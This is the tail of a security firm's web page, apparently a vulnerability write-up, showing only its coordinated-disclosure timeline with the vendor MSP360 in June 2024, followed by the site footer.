<h2 id="vendor-response--timelines">Vendor Response / Timelines</h2>

<ul>
  <li>2024-06-04 - Proactive Labs contact MSP360 to coordinate disclosure over email</li>
  <li>2024-06-04 - Vendor Response asking for initial details</li>
  <li>2024-06-04 - Proactive Labs provided initial write-up</li>
  <li>2024-06-05 - Follow up for initial thoughts from MSP360</li>
  <li>2024-06-17 - Follow up with MSP360, get auto-reply stating ticket has been closed</li>
  <li>2024-06-19 - Write-up released</li>
</ul>

</div>
      </div>
    </div>
  </section>
</main>

</div>
  <footer id="footer"><div class="footer-top">
  <div class="container">
    <div class="row">
      <div class="col-lg-3 col-md-6 footer-contact">
        <h3>Contact us</h3>
        <p>
          <strong>Email:</strong> info@proactivelabs.com.au<br />
          <strong>ABN:</strong> 15 665 297 432<br />
          <strong>Phone:</strong> 02 8599 7166<br />
          <strong>Address:</strong> Unit 10, 11 National Circuit<br />
          Barton ACT 2600<br />
          <br />
        </p>
      </div>

      <div class="col-lg-2 col-md-6 footer-links">
        <h4>Useful Links</h4>
        <ul>
          <li><i class="bx bx-chevron-right"></i> <a href="/">Home</a></li>
          <li>
            <i class="bx bx-chevron-right"></i> <a href="/about.html">About us</a>
          </li>
          <li>
            <i class="bx bx-chevron-right"></i> <a href="/whyus.html">Why us</a>
          </li>
          <li>
            <i class="bx bx-chevron-right"></i>
            <a href="/services/index.html">Services</a>
          </li>
          <li><i class="bx bx-chevron-right"></i> <a href="/blog.html">Blog</a></li>
          <li>
            <i class="bx bx-chevron-right"></i>
            <a href="/contact.html">Contact us</a>
          </li>
        </ul>
      </div>

      <div class="col-lg-3 col-md-6 footer-links">
        <h4>Our Services</h4>
        <ul>
          <li>
            <i class="bx bx-chevron-right"></i>
            <a href="/services/pentest.html">Penetration Testing</a>
          </li>
          <li>
            <i class="bx bx-chevron-right"></i>
            <a href="/services/threatemulation.html">Threat Emulation</a>
          </li>
          <li>
            <i class="bx bx-chevron-right"></i>
            <a href="/services/research.html">Research</a>
          </li>
          <li>
            <i class="bx bx-chevron-right"></i>
            <a href="/services/appsec.html">Application Security</a>
          </li>
          <li>
            <i class="bx bx-chevron-right"></i>
            <a href="/services/va.html">Vulnerability Assessments</a>
          </li>
          <li>
            <i class="bx bx-chevron-right"></i>
            <a aria-label="Code Review"  href="/services/codereview.html">Code Review</a>
          </li>
          <li>

            <i class="bx bx-chevron-right"></i>
            <a aria-label="Hardware / IoT Security Assessment"  href="/services/hardware.html">Hardware / IoT Security Assessment</a>
          </li>
          <li>
            <i class="bx bx-chevron-right"></i>
            <a aria-label="Cloud Security Assessment"  href="/services/cloud.html">Cloud Security Assessment</a>
          </li>
          <li>
            <i class="bx bx-chevron-right"></i>
            <a aria-label="Mobile Application Security Assessment"  href="/services/mobile.html">Mobile Application Security Assessment</a>
          </li>
          <li>
            <i class="bx bx-chevron-right"></i>
            <a aria-label="Operational Technology Security Assessment"  href="/services/ot.html">Operational Technology Security Assessment</a>
          </li>
        </ul>
      </div>
    </div>
  </div>
</div>

<div class="container d-md-flex py-4">
  <div class="me-md-auto text-center text-md-start">
    <div class="copyright">
      &copy; Copyright <strong><span>Proactive Labs</span></strong
      >. All Rights Reserved
    </div>
  </div>
  <div class="social-links text-center text-md-right pt-3 pt-md-0">
    <a
      href="https://twitter.com/ProactiveLabsAU"
      aria-label="Proactive Labs on Twitter"
      class="twitter"
    ><i class="bx bxl-twitter"></i
      ></a>
    <a
      href="https://github.com/proactivelabs"
      class="github"
      aria-label="Proactive Labs on GitHub"
    ><i class="bx bxl-github"></i
      ></a>
    <a
      href="https://au.linkedin.com/company/proactive-labs"
      aria-label="Proactive Labs on Linkedin"
      class="linkedin"
    ><i class="bx bxl-linkedin"></i
      ></a>
  </div>
</div>
</footer>

  <div id="preloader"></div>
  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
      class="bi bi-arrow-up-short"></i></a>

</body>

</html>
